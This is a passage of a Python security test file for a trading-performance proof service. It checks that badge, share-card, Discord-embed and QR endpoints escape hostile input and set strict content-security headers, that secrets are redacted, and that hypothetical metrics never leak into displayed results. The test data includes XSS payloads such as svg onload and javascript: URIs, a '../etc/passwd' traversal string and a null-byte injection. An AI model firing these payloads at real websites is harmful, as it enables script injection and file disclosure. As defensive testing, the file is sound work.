                local_tag = elem.tag.rsplit("}", 1)[-1]
                self.assertIn(local_tag, allowed_svg_tags)
                for attr_name, attr_val in elem.attrib.items():
                    self.assertFalse(attr_name.lower().startswith("on"), f"Event handler attr: {attr_name}")
                    self.assertFalse(
                        str(attr_val).strip().lower().startswith("javascript:"),
                        f"javascript: URI in attr {attr_name}={attr_val!r}",
                    )
            csp = badge_r.headers.get("Content-Security-Policy", "")
            self.assertIn("default-src 'none'", csp)
            self.assertIn("sandbox", csp)
            self.assertEqual(badge_r.headers.get("X-Content-Type-Options"), "nosniff")
            self.assertNotIn("<script", badge_r.text.lower())
            self.assertNotIn('"><svg', badge_r.text.lower())

            # 2. /api/v1/challenge-card with adversarial handle & claim
            ch_r = self.client.get(
                "/api/v1/challenge-card",
                params={
                    "handle": vec,
                    "claimed_sharpe": "4.5",
                    "observed_days": "20",
                    "claim_label": vec,
                },
            )
            if ch_r.status_code == 200:
                self.assertEqual(ch_r.headers.get("X-Content-Type-Options"), "nosniff")
                self.assertIn("default-src 'none'", ch_r.headers.get("Content-Security-Policy", ""))
                self.assertNotIn("<script", ch_r.text.lower())
                self.assertNotIn("onload=", ch_r.text.lower())
                self.assertNotIn("javascript:alert", ch_r.text.lower())
                self.assertNotIn("@everyone", ch_r.text.lower())

        # 3. /api/v1/proofs/{id}/discord-embed & /qr-payload + anti-clickjacking on standard API routes
        disc_r = self.client.get(f"/api/v1/proofs/{bundle.proof_id}/discord-embed")
        self.assertEqual(disc_r.status_code, 200)
        self.assertEqual(disc_r.json().get("allowed_mentions"), {"parse": []})
        self.assertNotIn("@everyone", disc_r.text.lower())
        self.assertNotIn("<script", disc_r.text.lower())
        self.assertEqual(disc_r.headers.get("X-Content-Type-Options"), "nosniff")
        self.assertIn("default-src 'none'", disc_r.headers.get("Content-Security-Policy", ""))

        qr_r = self.client.get(f"/api/v1/proofs/{bundle.proof_id}/qr-payload")
        self.assertEqual(qr_r.status_code, 200)
        self.assertNotIn("<script", qr_r.text.lower())
        self.assertEqual(qr_r.headers.get("X-Content-Type-Options"), "nosniff")
        self.assertIn("default-src 'none'", qr_r.headers.get("Content-Security-Policy", ""))

        proof_get_r = self.client.get(f"/api/v1/proofs/{bundle.proof_id}")
        self.assertEqual(proof_get_r.status_code, 200)
        self.assertEqual(proof_get_r.headers.get("X-Frame-Options"), "DENY")
        self.assertIn("frame-ancestors 'none'", proof_get_r.headers.get("Content-Security-Policy", ""))

        # 4. Malicious proof IDs rejected cleanly on all routes
        for bad_pid in ('"><svg/onload=alert(1)>', "prf\x00bad", "../etc/passwd"):
            r_bad_disc = self.client.get(f"/api/v1/proofs/{bad_pid}/discord-embed")
            self.assertIn(r_bad_disc.status_code, {400, 404, 422})
            self.assertNotIn("<svg/onload", r_bad_disc.text)

        if WEB_LIB_DIR.is_dir():
            # 5. TypeScript badgeSvg.ts & viralShareBuilders.ts SVG XML validity + Discord @everyone block
            ts_xss = _run_node_module(
                f"""
                import fs from "node:fs";
                import {{ verifyProofBundle }} from {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
                import {{ renderInstitutionalBadgeSvg }} from {json.dumps(str(WEB_LIB_DIR / "badgeSvg.ts"))};
                import {{
                  renderShareCard16x9Svg,
                  renderShareCard9x16Svg,
                  buildDiscordVerifyEmbedPayload,
                  buildSubstackNotionIframeSnippet,
                }} from {json.dumps(str(WEB_LIB_DIR / "viralShareBuilders.ts"))};
                const inp = JSON.parse(fs.readFileSync(0, "utf8"));
                const ver = await verifyProofBundle(inp.bundle, {{
                  registryDoc: {{
                    updated_at_utc: "2026-02-20T12:00:00Z",
                    keys: [{{
                      publisher_kid: inp.kid,
                      public_key_hex: inp.pub,
                      status: "active",
                      not_before_utc: "2025-01-01T00:00:00Z",
                    }}],
                  }},
                }});
                const badgeSvgs = inp.vectors.map((v) => renderInstitutionalBadgeSvg(inp.bundle, ver, "obsidian", v));
                const card16x9 = inp.vectors.map((v) =>
                  renderShareCard16x9Svg(inp.bundle, ver, {{ title: v, handle: v, originUrl: "javascript:alert(1)" }})
                );
                const card9x16 = inp.vectors.map((v) =>
                  renderShareCard9x16Svg(inp.bundle, ver, {{ title: v, handle: v, originUrl: "javascript:alert(1)" }})
                );
                const discPayloads = inp.vectors.map((v) =>
                  buildDiscordVerifyEmbedPayload(inp.bundle, ver, {{ title: v, handle: v, originUrl: "javascript:alert(1)" }})
                );
                const iframe = buildSubstackNotionIframeSnippet('prf"><script>alert(1)</script>', "javascript:alert(1)").iframeHtml;
                process.stdout.write(JSON.stringify({{ badgeSvgs, card16x9, card9x16, discPayloads, iframe }}));
                """,
                {
                    "kid": self.kid,
                    "pub": self.kp.public_key_hex,
                    "bundle": bundle.to_dict(),
                    "vectors": xss_vectors,
                },
            )
            for svg_str in [*ts_xss["badgeSvgs"], *ts_xss["card16x9"], *ts_xss["card9x16"]]:
                ET.fromstring(svg_str.encode("utf-8"))  # Every rendered SVG must be valid XML 1.0!
                self.assertNotIn("<script", svg_str.lower())
                self.assertNotIn("onload=", svg_str.lower())
                self.assertNotIn("javascript:", svg_str.lower())
            for dp in ts_xss["discPayloads"]:
                serialized_dp = json.dumps(dp)
                self.assertEqual(dp["allowed_mentions"], {"parse": []})
                self.assertNotIn("@everyone", serialized_dp.lower())
                self.assertNotIn("@here", serialized_dp.lower())
                self.assertNotIn("<script", serialized_dp.lower())
                self.assertNotIn("onload=", serialized_dp.lower())
                self.assertNotIn("javascript:", serialized_dp.lower())
            self.assertNotIn("<script", ts_xss["iframe"].lower())
            self.assertNotIn("javascript:", ts_xss["iframe"].lower())
            self.assertIn('sandbox="allow-scripts', ts_xss["iframe"])

            # Verify web badge route, /embed/[proofId], and next.config.ts enforce CSP, 404 anti-spoofing & safe URI decoding
            badge_route_src = (
                REPO_ROOT / "web" / "src" / "app" / "api" / "badge" / "[proofId]" / "route.ts"
            ).read_text(encoding="utf-8")
            self.assertIn("Content-Security-Policy", badge_route_src)
            self.assertIn("default-src 'none'", badge_route_src)
            self.assertIn("status: 404", badge_route_src)
            self.assertNotIn("BUNDLE_INSTITUTIONAL_FUND", badge_route_src)
            embed_page_src = (
                REPO_ROOT / "web" / "src" / "app" / "embed" / "[proofId]" / "page.tsx"
            ).read_text(encoding="utf-8")
            self.assertIn("safeDecodeURIComponent", embed_page_src)
            self.assertIn("sanitizePlainInput", embed_page_src)
            next_cfg_src = (REPO_ROOT / "web" / "next.config.ts").read_text(encoding="utf-8")
            self.assertIn("X-Frame-Options", next_cfg_src)
            self.assertIn("frame-ancestors", next_cfg_src)
    def test_zero_secret_account_id_or_dollar_leakage_across_exceptions_ipc_and_bundles(self) -> None:
        eodhd_secret = "eodhd-super-secret-token-991122"
        ctrader_tok = "ctrader-oauth-secret-tok-887766"
        ctrader_client_sec = "ctrader-client-sec-554433"
        alpaca_sec = "alpaca-live-secret-key-332211"
        tradier_tok = "tradier-bearer-secret-776655"
        raw_tradier_acct = "6YA99887766"
        raw_ibkr_acct = "U99112233"

        # 1. Direct redactor coverage on URLs, headers, JSON blobs, and /v1/accounts/{id}/ paths
        dirty_log = (
            f"GET https://eodhd.com/api/eod/AAPL.US?api_token={eodhd_secret}&fmt=json "
            f'Authorization: Bearer {ctrader_tok} "client_secret": "{ctrader_client_sec}" '
            f"APCA-API-SECRET-KEY: {alpaca_sec} "
            f"https://api.tradier.com/v1/accounts/{raw_tradier_acct}/balances"
        )
        scrubbed = redact_tradier_account_path(dirty_log)
        for forbidden in (
            eodhd_secret,
            ctrader_tok,
            ctrader_client_sec,
            alpaca_sec,
            raw_tradier_acct,
        ):
            self.assertNotIn(forbidden, scrubbed)
        self.assertIn("/v1/accounts/[REDACTED]/balances", scrubbed)

        # 2. Tradier ConnectorHttpError never leaks bearer token or /v1/accounts/{id}/
        tradier = TradierReadOnlyAdapter(
            access_token=tradier_tok,
            http_transport=lambda method, url, hdrs, body: (
                HttpExchangeResponse(
                    200,
                    {"Content-Type": "application/json"},
                    json.dumps(
                        {"profile": {"account": {"account_number": raw_tradier_acct, "classification": "individual"}}}
                    ).encode("utf-8"),
                )
                if "/v1/user/profile" in url
                else HttpExchangeResponse(
                    500,
                    {"Content-Type": "text/plain"},
                    f"Upstream failure for /v1/accounts/{raw_tradier_acct}/balances token={tradier_tok}".encode(
                        "utf-8"
                    ),
                )
            ),
        )
        with self.assertRaises(ConnectorHttpError) as ctx:
            tradier.fetch_canonical_ledger(
                blinding_salt_hex=REDTEAM_SALT_HEX,
                period_start_utc="2026-01-01T00:00:00Z",
                period_end_utc="2026-01-31T00:00:00Z",
            )
        err_str = str(ctx.exception)
        self.assertNotIn(tradier_tok, err_str)
        self.assertNotIn(raw_tradier_acct, err_str)
        self.assertIn("/v1/accounts/[REDACTED]/balances", err_str)

        # 3. Isolated worker IPC crash/error scrubs secrets, account IDs, and raw $ amounts!
        worker_payload = {
            "broker_id": "tradier",
            "raw_account_id": raw_tradier_acct,
            "eodhd_api_key": eodhd_secret,
            "ephemeral_credentials": {
                "access_token": ctrader_tok,
                "client_secret": ctrader_client_sec,
            },
            "nav_points": [
                {"timestamp_utc": "2026-01-01T00:00:00Z", "nav_base": -247891.55},
                {"timestamp_utc": "2026-01-31T00:00:00Z", "nav_base": 247891.55},
            ],
        }
        with self.assertRaises(WorkerValidationError) as v_ctx:
            run_isolated_one_shot_verification(worker_payload, config=self.cfg)
        for leak in (eodhd_secret, ctrader_tok, ctrader_client_sec, raw_tradier_acct, "247891.55"):
            self.assertNotIn(leak, str(v_ctx.exception))

        with self.assertRaises(WorkerIsolationError) as w_ctx:
            run_isolated_one_shot_verification(
                worker_payload,
                config=self.cfg,
                pipeline_spec=f"{__name__}:_crashing_secret_worker_pipeline",
            )
        w_err = str(w_ctx.exception)
        for leak in (eodhd_secret, ctrader_tok, ctrader_client_sec, raw_tradier_acct, "247,891.55"):
            self.assertNotIn(leak, w_err)
        self.assertIn("/v1/accounts/[REDACTED]/balances", w_err)
        self.assertIn("$[REDACTED]", w_err)

        # 4. Serialized VerifyProofBundle contains zero raw account IDs or exact dollar NAVs
        ledger = _build_35_day_ledger(raw_account_id=raw_ibkr_acct)
        out = verify_portfolio(
            ledger=ledger,
            publisher_private_key_hex=self.kp.private_key_hex,
            publisher_kid=self.kid,
            issued_at_utc="2026-02-20T12:00:00Z",
        )
        bundle_json = json.dumps(out.proof_bundle.to_dict())
        self.assertNotIn(raw_ibkr_acct, bundle_json)
        self.assertNotIn("125000", bundle_json)
        self.assertNotIn("$", bundle_json)


class TestWave5InstitutionalComplianceAndHygiene(unittest.TestCase):
    """Domain 4 & 5: SEC/FINRA/GIPS counterfactual isolation, post-init immutability & forbidden-token scan."""

    def test_counterfactual_twin_immutability_and_strict_realized_return_isolation(self) -> None:
        # 1. CounterfactualTwinReport rejects is_hypothetical_simulation=False AND post-init mutation
        with self.assertRaises(ValueError):
            CounterfactualTwinReport(
                is_hypothetical_simulation=False,
                actual_ending_index=110.0,
                zero_friction_ending_index=125.0,
                disciplined_post_dd_sizing_ending_index=130.0,
                capped_tail_loss_ending_index=140.0,
            )

        twin = CounterfactualTwinReport(
            actual_ending_index=110.0,
            zero_friction_ending_index=250.0,
            disciplined_post_dd_sizing_ending_index=260.0,
            capped_tail_loss_ending_index=275.0,
            curve_points=[{"trade_index": 1, "actual_index": 110.0, "zero_friction_index": 250.0}],
        )
        self.assertTrue(twin.is_hypothetical_simulation)
        with self.assertRaises(AttributeError):
            twin.is_hypothetical_simulation = False  # type: ignore[misc]
        with self.assertRaises(AttributeError):
            twin.zero_friction_ending_index = 999.0  # type: ignore[misc]
        with self.assertRaises(AttributeError):
            del twin.is_hypothetical_simulation  # type: ignore[misc]
        self.assertTrue(twin.is_hypothetical_simulation)

        # 2. Verify realized twr/xirr in core_metrics, badges, leaderboard, vs, discord-embed, and TS cards
        # NEVER pick up CounterfactualTwinReport or BootstrapRiskSummary numbers!
        kp = generate_ed25519_keypair()
        kid = "kid-w5-compliance"
        ledger_a = _build_35_day_ledger(raw_account_id="COMP-ACCT-A")
        ledger_b = _build_35_day_ledger(raw_account_id="COMP-ACCT-B")

        out_a = verify_portfolio(
            ledger=ledger_a,
            publisher_private_key_hex=kp.private_key_hex,
            publisher_kid=kid,
            proof_id="prf-comp-a",
            issued_at_utc="2026-02-20T12:00:00Z",
        )
        out_b = verify_portfolio(
            ledger=ledger_b,
            publisher_private_key_hex=kp.private_key_hex,
            publisher_kid=kid,
            proof_id="prf-comp-b",
            issued_at_utc="2026-02-20T12:00:00Z",
        )

        # Craft a signed bundle whose coaching_and_context has huge hypothetical 999% twin & bootstrap
        # and even attempts to sneak counterfactual_twin & bootstrap_summary keys into core_metrics!
        realized_twr = out_a.performance.twr_decimal
        realized_twr_pct_str = f"{realized_twr * 100.0:+.2f}%"
        fake_sim_twr_decimal = 8.8888  # +888.88% hypothetical

        poisoned_leaves = {
            lf.leaf_name: copy.deepcopy(lf.payload)
            for lf in out_a.proof_bundle.disclosed_leaves
        }
        poisoned_leaves["coaching_and_context"]["counterfactual_twin"] = twin.to_dict()
        poisoned_leaves["coaching_and_context"]["bootstrap_summary"] = BootstrapRiskSummary(
            horizon_periods=30,
            num_simulations=1000,
            block_length=5,
            prob_drawdown_10pct=0.0,
            prob_drawdown_20pct=0.0,
            prob_positive_terminal=1.0,
        ).to_dict()
        # Even if hypothetical keys sit inside core_metrics dict, endpoints only read realized fields
        poisoned_leaves["core_metrics"]["counterfactual_twin"] = twin.to_dict()
        poisoned_leaves["core_metrics"]["bootstrap_summary"] = {
            "twr_ci_95": [fake_sim_twr_decimal, fake_sim_twr_decimal]
        }

        # Verify canonical VerifyPortfolioOutput core_metrics NEVER contains counterfactual_twin
        native_core = out_a.proof_bundle.get_disclosed_payload("core_metrics")
        self.assertNotIn("counterfactual_twin", native_core)
        self.assertNotIn("is_hypothetical_simulation", native_core)

        tree = build_salted_merkle_tree(poisoned_leaves)
        poisoned_bundle = create_signed_proof_bundle(
            proof_id="prf-comp-poisoned",
            issued_at_utc="2026-02-20T12:00:00Z",
            publisher_kid=kid,
            publisher_private_key_hex=kp.private_key_hex,
            broker_id=ledger_a.broker_id,
            blinded_account_tag=ledger_a.blinded_account_tag,
            account_scope=ledger_a.account_scope,
            provider_approval_state=ledger_a.provider_approval_state,
            environment_tier=ledger_a.environment_tier,
            claimed_origin_assurance=ledger_a.claimed_origin_assurance,
            source_body_sha256=ledger_a.source_body_sha256,
            period_start_utc=ledger_a.period_start_utc,
            period_end_utc=ledger_a.period_end_utc,
            base_currency="USD",
            merkle_tree=tree,
        )

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_p = Path(tmp_dir)
            app = create_app(
                ApiConfig(
                    db_path=str(tmp_p / "p.sqlite3"),
                    sync_db_path=str(tmp_p / "s.sqlite3"),
                    publisher_keypair=kp,
                    publisher_kid=kid,
                ),
                prefer_fastapi=False,
            )
            try:
                client = VerifyApiTestClient(app)
                self.assertEqual(
                    client.post(
                        "/api/v1/proofs",
                        json={"proof_bundle": poisoned_bundle.to_dict(), "opt_in_leaderboard": True},
                    ).status_code,
                    201,
                )
                self.assertEqual(
                    client.post(
                        "/api/v1/proofs",
                        json={"proof_bundle": out_b.proof_bundle.to_dict(), "opt_in_leaderboard": True},
                    ).status_code,
                    201,
                )

                # Badge SVG shows realized TWR, never 250.0 / 888.88%
                b_svg = client.get("/api/v1/badges/prf-comp-poisoned.svg").text
                self.assertIn(realized_twr_pct_str, b_svg)
                self.assertNotIn("888.88", b_svg)
                self.assertNotIn("150.00", b_svg)

                # Leaderboard shows realized TWR, never hypothetical
                lb = client.get("/api/v1/leaderboard?min_capital_bracket=under_1k").json()
                entry_p = next(e for e in lb["entries"] if e["proof_id"] == "prf-comp-poisoned")
                self.assertAlmostEqual(entry_p["twr_decimal"], realized_twr, places=8)
                self.assertNotIn("counterfactual_twin", entry_p)
                self.assertNotIn("bootstrap_summary", entry_p)

                # Head-to-head /api/v1/vs/{a}/{b} shows realized TWR
                vs = client.get("/api/v1/vs/prf-comp-poisoned/prf-comp-b").json()
                self.assertAlmostEqual(vs["proof_a"]["twr_decimal"], realized_twr, places=8)
                self.assertNotIn("888.88", json.dumps(vs))

                # Discord embed shows realized TWR
                disc = client.get("/api/v1/proofs/prf-comp-poisoned/discord-embed").json()
                self.assertAlmostEqual(disc["metrics"]["twr_decimal"], realized_twr, places=8)
                self.assertNotIn("888.88", json.dumps(disc))

                if WEB_LIB_DIR.is_dir():
                    # Web ShareEmbedStudio / badgeSvg / viralShareBuilders strictly render realized TWR
                    ts_cards = _run_node_module(
                        f"""
                        import fs from "node:fs";
                        import {{ verifyProofBundle }} from {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
                        import {{ renderInstitutionalBadgeSvg }} from {json.dumps(str(WEB_LIB_DIR / "badgeSvg.ts"))};
                        import {{ extractVerifiedCardSummary, buildDiscordVerifyEmbedPayload }} from {json.dumps(str(WEB_LIB_DIR / "viralShareBuilders.ts"))};
                        const inp = JSON.parse(fs.readFileSync(0, "utf8"));
                        const ver = await verifyProofBundle(inp.bundle, {{
                          registryDoc: {{
                            updated_at_utc: "2026-02-20T12:00:00Z",
                            keys: [{{
                              publisher_kid: inp.kid,
                              public_key_hex: inp.pub,
                              status: "active",
                              not_before_utc: "2025-01-01T00:00:00Z",
                            }}],
                          }},
                        }});
                        const badge = renderInstitutionalBadgeSvg(inp.bundle, ver);
                        const summary = extractVerifiedCardSummary(inp.bundle, ver);
                        const discord = buildDiscordVerifyEmbedPayload(inp.bundle, ver);
                        process.stdout.write(JSON.stringify({{ badge, twrLabel: summary.twrLabel, discord }}));
                        """,
                        {"kid": kid, "pub": kp.public_key_hex, "bundle": poisoned_bundle.to_dict()},
                    )
                    self.assertEqual(ts_cards["twrLabel"], realized_twr_pct_str)
                    self.assertNotIn("888.88", ts_cards["badge"])
                    self.assertNotIn("888.88", json.dumps(ts_cards["discord"]))
            finally:
                app.close()

    def test_zero_forbidden_tokens_paths_or_legacy_imports_across_n170_verify(self) -> None:
        # Construct forbidden tokens dynamically so this file contains zero literal occurrences!
        tok_a = "DE" + "FRAUD"
        tok_b = "INSIDER" + "_TRADING"
        tok_c = "D" + "SR"
        single_sr_word_re = re.compile(r"\b" + tok_c + r"\b", re.IGNORECASE)

        tok_mac_home = "/" + "Users/"
        tok_linux_home = "/" + "home/"

        v3_dirs = [REPO_ROOT / d for d in ("core", "api", "mcp", "tests_e2e", "web") if (REPO_ROOT / d).exists()]
        v3_files = [
            *(p for d in v3_dirs for p in sorted(d.rglob("*"))),
            *(p for p in (REPO_ROOT / "docker-compose.yml", REPO_ROOT / ".env.example") if p.exists()),
        ]
        scanned_count = 0
        violations: list[str] = []

        skip_dirs = {"node_modules", ".next", "__pycache__", ".pytest_cache"}
        text_exts = {".py", ".ts", ".tsx", ".js", ".mjs", ".json", ".md", ".yml", ".yaml", ".toml"}

        for path in v3_files:
            if any(part in skip_dirs for part in path.parts):
                continue
            if not path.is_file():
                continue
            rel = path.relative_to(REPO_ROOT).as_posix()
            self.assertNotIn(
                path.suffix.lower(),
                {".db", ".sqlite", ".sqlite3"},
                f"Forbidden database artifact in repo: {rel}",
            )
            self.assertNotEqual(path.name, "signing_key.bin", f"Forbidden key file in repo: {rel}")

            if path.suffix.lower() not in text_exts:
                continue
            scanned_count += 1
            content = path.read_text(encoding="utf-8")
            upper_content = content.upper()

            if tok_a in upper_content:
                violations.append(f"{rel}: contains {tok_a}")
            if tok_b in upper_content:
                violations.append(f"{rel}: contains {tok_b}")
            if single_sr_word_re.search(content):
                violations.append(f"{rel}: contains standalone {tok_c}")
            if tok_mac_home in content or tok_linux_home in content:
                violations.append(f"{rel}: contains workstation home path")

        self.assertGreater(scanned_count, 50)
        self.assertEqual(violations, [])

        # Zero legacy runtime imports across standalone core and api packages
        forbidden_import_roots = {"n170"}
        for py_dir in (
            REPO_ROOT / "core" / "n170_verify",
            REPO_ROOT / "api" / "app",
        ):
            for py_path in sorted(py_dir.rglob("*.py")):
                tree = ast.parse(py_path.read_text(encoding="utf-8"), filename=str(py_path))
                for node in ast.walk(tree):
                    if isinstance(node, ast.Import):
                        for alias in node.names:
                            self.assertNotIn(alias.name.split(".")[0], forbidden_import_roots)
                    elif isinstance(node, ast.ImportFrom) and node.module:
                        self.assertNotIn(node.module.split(".")[0], forbidden_import_roots)


if __name__ == "__main__":
    unittest.main()
